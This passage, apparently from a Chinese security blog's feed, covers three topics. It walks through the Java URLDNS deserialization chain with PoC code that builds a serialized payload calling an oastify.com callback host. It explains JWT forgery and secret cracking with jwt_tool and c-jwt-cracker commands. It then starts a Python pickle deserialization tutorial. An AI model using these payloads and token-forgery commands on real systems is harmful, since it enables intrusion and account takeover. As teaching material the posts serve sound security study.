class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">// synchronized用于在多线程环境中实现同步，确保同一时刻只有一个线程可以执行某个代码块或方法</span><br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)  <span class="hljs-comment">// 值得注意的是这里需要让hashCode这个变量为在序列化的时候在调用put()前不为-1，在反序列化的时候为-1，防止造成干扰</span><br>        <span class="hljs-keyword">return</span> hashCode;  <br>  <br>    hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<span class="hljs-comment">// 我们要调用到handler这个对象的hashCode()方法</span><br>    <span class="hljs-keyword">return</span> hashCode;  <br>&#125;<br><br><span class="hljs-keyword">transient</span> URLStreamHandler handler;<br><span class="hljs-comment">// 声明了一个名为 `handler` 的成员变量，其类型是 `URLStreamHandler`</span><br><br><span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">if</span> (hostAddress != <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">return</span> hostAddress;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.isEmpty()) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        hostAddress = InetAddress.getByName(host); <span class="hljs-comment">// 作用是根据主机名获取其IP地址，在网络上表现出来就是一次DNS查询 </span><br>    &#125; <span class="hljs-keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> hostAddress;  <br>&#125;<br><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;  <br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><ul><li>跟进<code>handler</code>这个实例的类<code>URLStreamHandler</code>，其为<code>java.net.URLStreamHandler</code>，去找它的<code>hashCode()</code></li></ul><h5 id="如何让hashCode不为-1"><a href="#如何让hashCode不为-1" class="headerlink" title="如何让hashCode不为-1"></a>如何让hashCode不为-1</h5><ul><li>值得注意的是，<em><strong>在序列化payload的过程中其实也是会发出序列化请求的</strong></em></li><li>这是因为序列化的时候调用了<code>put()</code>方法，为了把恶意内容写进<code>HashMap</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 这里让put()不要发起请求  </span><br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>);  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br>hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br>hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br><span class="hljs-comment">// 这里把 hashCode 改为 1234； 通过反射的技术改变已有对象的属性  </span><br>hashmap.put(url,<span class="hljs-number">1</span>);  <br><span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span><br>hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br>serialize(hashmap);<br></code></pre></td></tr></table></figure></li></ul><h4 id="java-net-URLStreamHandler"><a href="#java-net-URLStreamHandler" class="headerlink" title="java.net.URLStreamHandler;"></a>java.net.URLStreamHandler;</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>  <br>    <span class="hljs-comment">// Generate the protocol part.  </span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();  <br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)  <br>        h += protocol.hashCode();  <br>  <br>    <span class="hljs-comment">// Generate the host part.  </span><br>    <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);  <span class="hljs-comment">// 注意到这里调用了getHostAddress()，进行跟进</span><br>    <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;  <br>        h += addr.hashCode();  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();  <br>        <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)  <br>            h += host.toLowerCase(Locale.ROOT).hashCode();  <br>    &#125;<br>      <br>......<br><br>    <span class="hljs-keyword">return</span> h;  <br>&#125;<br><br><span class="hljs-keyword">protected</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;  <br>    <span class="hljs-keyword">return</span> u.getHostAddress();  <span class="hljs-comment">// 这个getHostAddress()在URL类中，定义在上面</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><h5 id="为什么要在序列化的时候调用put-方法"><a href="#为什么要在序列化的时候调用put-方法" class="headerlink" title="为什么要在序列化的时候调用put()方法"></a>为什么要在序列化的时候调用put()方法</h5><ul><li>如果在生成<code>payload</code>的时候不调用<code>put()</code>，那么在这个<code>HashMap</code>就是空的</li><li>而如果把一个空的<code>HashMap</code>序列化后发给目标，目标反序列化出来也是一个空的<code>HashMap</code></li><li><code>put(u,url)</code>是为了把我们的恶意URL对象放进<code>HashMap</code>里，用于<code>readObject()</code>的调用</li></ul><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br> HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// 这里不要发起请求  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>); <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);  <br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>);  <br> serialize(hashmap);  <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>JAVA</tag>
      
      <tag>GadgetChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JWT</title>
    <link href="/2025/10/28/JWT/"/>
    <url>/2025/10/28/JWT/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>JSON Web Token（<strong>JSON Web令牌</strong>）</li><li>是一种跨域验证身份的方案</li><li>JWT<strong>不加密传输</strong>的数据，但能通过<strong>数字签名来验证数据未被篡改</strong></li></ul><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>1、用户端登录，用户名和密码在请求中被发往服务器<br>2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不 应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时， 服务器并没有保存登录状态信息。<br>3、服务器将 JWT（通过响应）返回给客户端<br>4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态6、服务器返回响应</p><h4 id="JWT与session区别："><a href="#JWT与session区别：" class="headerlink" title="JWT与session区别："></a>JWT与session区别：</h4><ul><li>两者的主要目的都是存储用户信息</li><li>但是session将用户信息存储再服务器端</li><li>而JWT则是在客户端。JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力</li></ul><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ul><li>头部（Header）<ul><li><code>alg</code>：说明这个JWT的签名<strong>使用的算法</strong>的参数，常见值用HS256（默认），HS512等，也可以为None。HS256 表示 HMAC SHA256。 </li><li><code>type</code>：说明这个 token 的类型，此例中为 JWT</li></ul></li><li>声明（Claims）</li><li>签名（Signature）</li><li>头部、声明、签名，三个部分以<code>.</code>隔开</li><li>JWT 的头部和声明以 Base64URL 进行了编码</li><li>不过签名在在加密前有一个密钥，与头部和声明都有关系<ul><li>没有签名可以更改头部内容，改为none，有些可以绕过，主要看对方是否检查签名</li></ul></li><li>在HTTP传输过程中，base64编码中的<code>=、,、+、/</code>等特殊符号通过url解码通常容易产生歧义，因此产生了与url编码兼容的base64url编码<ul><li><code>+</code>会变成<code>-</code>，<code>/</code>会变成<code>_</code>，<code>=</code>会被<strong>去掉</strong>，以此达到url safe的目的<br>![[..&#x2F;img&#x2F;4.png]]</li></ul></li></ul><h4 id="标准中注册的声明-建议但不强制使用-："><a href="#标准中注册的声明-建议但不强制使用-：" class="headerlink" title="标准中注册的声明 (建议但不强制使用) ："></a>标准中注册的声明 (建议但不强制使用) ：</h4><ul><li>iss: jwt签发者</li><li>sub: jwt所面向的用户</li><li>aud: 接收jwt的一方</li><li>exp: jwt的过期时间，这个过期时间必须要大于签发时间</li><li>nbf: 定义在什么时间之前，该jwt都是不可用的.</li><li>iat: jwt的签发时间</li><li>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li></ul><h4 id="Refresh-token"><a href="#Refresh-token" class="headerlink" title="Refresh token"></a>Refresh token</h4><ul><li>JWT使用refresh token去刷新access token而无需再次身份验证</li><li>refresh token的存活时间较长而access token的存活时间较短</li><li>服务器中可能存在：未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token</li><li><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></li></ul><h4 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h4><ul><li>无密钥：修改alg，删除签名（即对方不检查签名，未验证签名算法）</li><li>有密钥：对应修改数据后重新加密</li></ul><h3 id="在线解密平台"><a href="#在线解密平台" class="headerlink" title="在线解密平台"></a>在线解密平台</h3><p><a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li><strong>可在JWT的headers，payload部分的参数值中插入常见漏洞相关payload去尝试，尽管我们不知道signature key</strong>。</li></ul><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><h4 id="c-jwt-cracker-jwt"><a href="#c-jwt-cracker-jwt" class="headerlink" title="c-jwt-cracker-jwt"></a>c-jwt-cracker-jwt</h4><ul><li><a href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius&#x2F;c-jwt-cracker: JWT brute force cracker written in C</a></li><li>该工具直接<em><strong>硬爆密钥</strong></em><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入目录里，然后：</span><br>docker build . -t jwtcrack<br><span class="hljs-comment">## 以后直接输入下列命令就行：</span><br>docker run -it --<span class="hljs-built_in">rm</span> jwtcrack JWT串<br></code></pre></td></tr></table></figure></li></ul><h4 id="jwt-tool"><a href="#jwt-tool" class="headerlink" title="jwt_tool"></a>jwt_tool</h4><ul><li><a href="https://github.com/ticarpi/jwt_tool">ticarpi&#x2F;jwt_tool: :snake: A toolkit for testing, tweaking and cracking JSON Web Tokens</a></li><li>该工具可以<em><strong>硬爆密钥</strong></em>，也可以<em><strong>根据字典爆密钥</strong></em>，也可以在得到密钥后进行<em><strong>伪造</strong></em><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解码获得信息</span><br>python jwt_tool.py JWT串<br><br><span class="hljs-comment"># 根据字典爆破</span><br>python jwt_tool.py JWT串 -C -d 字典.txt<br><span class="hljs-comment">## -C:对JWT进行压缩，以缩短字节长度</span><br><span class="hljs-comment">## -d:指定字典文件</span><br><span class="hljs-comment">## 成功展示：</span><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">Original JWT:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin123 is the CORRECT key!</span><br><span class="hljs-string">You can tamper/fuzz the token contents (-T/-I) and sign it using:</span><br><span class="hljs-string">python3 jwt_tool.py [options here] -S hs256 -p &quot;admin123&quot;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">## 验证密钥</span><br>python jwt_tool.py JWT串 -C -p secret(密钥)<br><br><span class="hljs-comment"># 使用&quot;none&quot;算法创建未验证(即无签名)的令牌</span><br>python jwt_tool.py JWT串 -X a<br><span class="hljs-comment"># 使用密钥进行签名伪造</span><br>python jwt_tool.py JWT串 -I -pc user -pv admin -S hs256 -p <span class="hljs-string">&quot;admin123&quot;</span><br><span class="hljs-comment">## -pc:payloadclaim，键值中的键</span><br><span class="hljs-comment">## -pv:payloadvalue，键值中的值</span><br><span class="hljs-comment">## -S:选择签名算法</span><br><span class="hljs-comment">## -I:开启注入的claim的伪造</span><br><br><span class="hljs-comment"># 使用公钥验证令牌</span><br>python jwt_tool.py JWT串 -V -pk my_public.pem<br><span class="hljs-comment">## 或</span><br>python juw_tool.py JWT串 -V -jw my_public_jwks.json<br><br><span class="hljs-comment"># 交互式修改头部和负载声明</span><br></code></pre></td></tr></table></figure></li><li>options：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span><br>-b, --bare            <span class="hljs-built_in">return</span> TOKENS ONLY<br>-t TARGETURL, --targeturl TARGETURL<br>                        URL to send HTTP request to with new JWT<br>-r REQUEST, --request REQUEST<br>                        URL request to base on<br>-rt RATE, --rate RATE<br>                        Max. number of requests per minute<br>-i, --insecure        Use HTTP <span class="hljs-keyword">for</span> passed request<br>-rc COOKIES, --cookies COOKIES<br>                        request cookies to send with the forged HTTP request<br>-rh HEADERS, --headers HEADERS<br>                        request headers to send with the forged HTTP request (can be used multiple <span class="hljs-built_in">times</span> <span class="hljs-keyword">for</span> additional headers)<br>-pd POSTDATA, --postdata POSTDATA<br>                        text string that contains all the data to be sent <span class="hljs-keyword">in</span> a POST request<br>-cv CANARYVALUE, --canaryvalue CANARYVALUE<br>                        text string that appears <span class="hljs-keyword">in</span> response <span class="hljs-keyword">for</span> valid token (e.g. <span class="hljs-string">&quot;Welcome, ticarpi&quot;</span>)<br>-np, --noproxy        <span class="hljs-built_in">disable</span> proxy <span class="hljs-keyword">for</span> current request (change <span class="hljs-keyword">in</span> jwtconf.ini <span class="hljs-keyword">if</span> permanent)<br>-nr, --noredir        <span class="hljs-built_in">disable</span> redirects <span class="hljs-keyword">for</span> current request (change <span class="hljs-keyword">in</span> jwtconf.ini <span class="hljs-keyword">if</span> permanent)<br>-M MODE, --mode MODE  Scanning mode:<br>                        pb = playbook audit<br>                        er = fuzz existing claims to force errors<br>                        cc = fuzz common claims<br>                        at - All Tests!<br>-X EXPLOIT, --exploit EXPLOIT <span class="hljs-comment"># 利用</span><br>                        eXploit known vulnerabilities:<br>                        a = alg:none<br>                        n = null signature<br>                        b = blank password accepted <span class="hljs-keyword">in</span> signature<br>                        p = <span class="hljs-string">&#x27;psychic signature&#x27;</span> accepted <span class="hljs-keyword">in</span> ECDSA signing<br>                        s = spoof JWKS (specify JWKS URL with -ju, or <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> jwtconf.ini to automate this attack)<br>                        k = key confusion (specify public key with -pk)<br>                        i = inject inline JWKS<br>-ju JWKSURL, --jwksurl JWKSURL<br>                        URL location <span class="hljs-built_in">where</span> you can host a spoofed JWKS<br>-S SIGN, --sign SIGN  sign the resulting token:# 签名算法<br>                        hs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)<br>                        rs256/rs384/rs512 = RSA signing (specify an RSA private key with -<span class="hljs-built_in">pr</span>)<br>                        es256/es384/es512 = Elliptic Curve signing (specify an EC private key with -<span class="hljs-built_in">pr</span>)<br>                        ps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -<span class="hljs-built_in">pr</span>)<br>-<span class="hljs-built_in">pr</span> PRIVKEY, --privkey PRIVKEY<br>                        Private Key <span class="hljs-keyword">for</span> Asymmetric crypto<br>-T, --tamper          tamper with the JWT contents<br>                        (<span class="hljs-built_in">set</span> signing options with -S or use exploits with -X)<br>-I, --injectclaims    inject new claims and update existing claims with new values<br>                        (<span class="hljs-built_in">set</span> signing options with -S or use exploits with -X)<br>                        (<span class="hljs-built_in">set</span> target claim with -hc/-pc and injection values/lists with -hv/-pv<br>-hc HEADERCLAIM, --headerclaim HEADERCLAIM<br>                        Header claim to tamper with<br>-pc PAYLOADCLAIM, --payloadclaim PAYLOADCLAIM<br>                        Payload claim to tamper with<br>-hv HEADERVALUE, --headervalue HEADERVALUE<br>                        Value (or file containing values) to inject into tampered header claim<br>-pv PAYLOADVALUE, --payloadvalue PAYLOADVALUE<br>                        Value (or file containing values) to inject into tampered payload claim<br>-C, --crack           crack key <span class="hljs-keyword">for</span> an HMAC-SHA token <span class="hljs-comment"># 进行HMAC算法的密钥爆破</span><br>                        (specify -d/-p/-kf)<br>-d DICT, --dict DICT  dictionary file <span class="hljs-keyword">for</span> cracking <span class="hljs-comment"># 字典爆破</span><br>-p PASSWORD, --password PASSWORD<br>                        password <span class="hljs-keyword">for</span> cracking<br>-kf KEYFILE, --keyfile KEYFILE<br>                        keyfile <span class="hljs-keyword">for</span> cracking (when signed with <span class="hljs-string">&#x27;kid&#x27;</span> attacks)<br>-V, --verify          verify the RSA signature against a Public Key<br>                        (specify -pk/-jw)<br>-pk PUBKEY, --pubkey PUBKEY<br>                        Public Key <span class="hljs-keyword">for</span> Asymmetric crypto<br>-jw JWKSFILE, --jwksfile JWKSFILE<br>                        JSON Web Key Store <span class="hljs-keyword">for</span> Asymmetric crypto<br>-Q QUERY, --query QUERY<br>                        Query a token ID against the logfile to see the details of that request<br>                        e.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a<br>-v, --verbose         When parsing and printing, produce (slightly more) verbose output.<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>uncategorized</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JWT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle反序列化-1</title>
    <link href="/2025/10/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/"/>
    <url>/2025/10/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
    
    <content type="html"><![CDATA[<p>整合1-2-4-5-6</p><h3 id="pickle库解析"><a href="#pickle库解析" class="headerlink" title="pickle库解析"></a>pickle库解析</h3><ul><li>这是Python的<em><strong>标准库</strong></em>，用于<strong>序列化</strong>和<strong>反序列化</strong>Python对象</li><li>在python中序列化是将Python对象转换为<em><strong>字节串</strong></em>（以字符串形式存在）的过程<ul><li>字符串是二进制的形式</li><li>这里的字节串其实就是<em><strong>opcode</strong></em>（<em><strong>操作码</strong></em>）</li></ul></li><li>读取和序列化储存的文件的后缀为<code>.pkl</code>，不能直接打开预览</li></ul><h4 id="方法与属性与协议"><a href="#方法与属性与协议" class="headerlink" title="方法与属性与协议"></a>方法与属性与协议</h4><table><thead><tr><th>特点</th><th>序列化</th><th>反序列化</th><th>作用</th></tr></thead><tbody><tr><td>针对文件</td><td>pickle.dump(obj,file)</td><td>pickle.load(file)</td><td>将对象序列化写入文件或从文件读取并反序列化对象</td></tr><tr><td>针对字节串</td><td>pickle.dumps(obj)</td><td>pickle.loads(bytes)</td><td>字节串&lt;–&gt;对象</td></tr><tr><td>-</td><td>-</td><td><strong>在反序列化一个实例时会自动引入没有引入的库</strong></td><td></td></tr></tbody></table><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>pickle.HIGHEST_PROTOCOL</td><td>可用的最高协议版本</td></tr><tr><td>pickle.DEFAULT_PROTOCOL</td><td>默认协议版本（通常为4）</td></tr></tbody></table><table><thead><tr><th>协议版本</th><th>作用</th></tr></thead><tbody><tr><td>0</td><td>人类可读的ASCII格式（兼容旧版），并且向后兼容早期版本的 Python</td></tr><tr><td>1</td><td>二进制格式（兼容旧版），与早期版本的python兼容</td></tr><tr><td>2</td><td>Python 2.3+ 优化支持类对象，为存储 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307">PEP 307</a></td></tr><tr><td>3</td><td>Python 3.0+ 默认协议（不支持Python 2），具有对 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes">bytes</a> 对象的显式支持，且无法被 Python 2.x 打开</td></tr><tr><td>4</td><td>Python 3.4+ 支持更大对象和更多数据类型，包括一些针对数据格式的优化，参阅 <a href="https://www.python.org/dev/peps/pep-3154">PEP 3154</a></td></tr><tr><td>5</td><td>Python 3.8+ 支持内存优化和数据共享</td></tr><tr><td>-1&#x2F;None</td><td>使用默认的最高协议版本</td></tr></tbody></table><ul><li>在所有版本的协议中，0号版本是<em><strong>人类最可读</strong></em>的</li><li>使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新</li><li>由于pickle协议通常是<em><strong>向前兼容</strong></em>的，所以<em><strong>v0版本的字符串</strong></em>可以<em><strong>直接交给</strong></em><code>pickle.loads()</code>而不用担心引发意外</li></ul><h4 id="打包class"><a href="#打包class" class="headerlink" title="打包class"></a>打包class</h4><ul><li>需要注意的是，对于自定义<code>class</code>，不是对成员变量赋初值的话这个变量是不会被打包的</li><li>需要用<code>__init__</code>构造方法转换<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br>date = <span class="hljs-number">20241004</span><br><span class="hljs-comment"># 这样的话date是不会被打包的</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">dairy</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-variable language_">self</span>.date = <span class="hljs-number">20241004</span><br><span class="hljs-comment"># 这样就能被打包了</span><br>d = dairy()<br><span class="hljs-built_in">print</span>(pickle.dumps(d))<br></code></pre></td></tr></table></figure></li></ul><h3 id="pickle反序列化函数利用过程解析"><a href="#pickle反序列化函数利用过程解析" class="headerlink" title="pickle反序列化函数利用过程解析"></a>pickle反序列化函数利用过程解析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 进入pickle类看load和loads</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_load</span>(<span class="hljs-params">file, *, fix_imports=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&quot;ASCII&quot;</span>, errors=<span class="hljs-string">&quot;strict&quot;</span>,</span><br><span class="hljs-params">          buffers=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> _Unpickler(file, fix_imports=fix_imports, buffers=buffers,<br>                     encoding=encoding, errors=errors).load()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_loads</span>(<span class="hljs-params">s, /, *, fix_imports=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&quot;ASCII&quot;</span>, errors=<span class="hljs-string">&quot;strict&quot;</span>,</span><br><span class="hljs-params">           buffers=<span class="hljs-literal">None</span></span>):<br>    <span 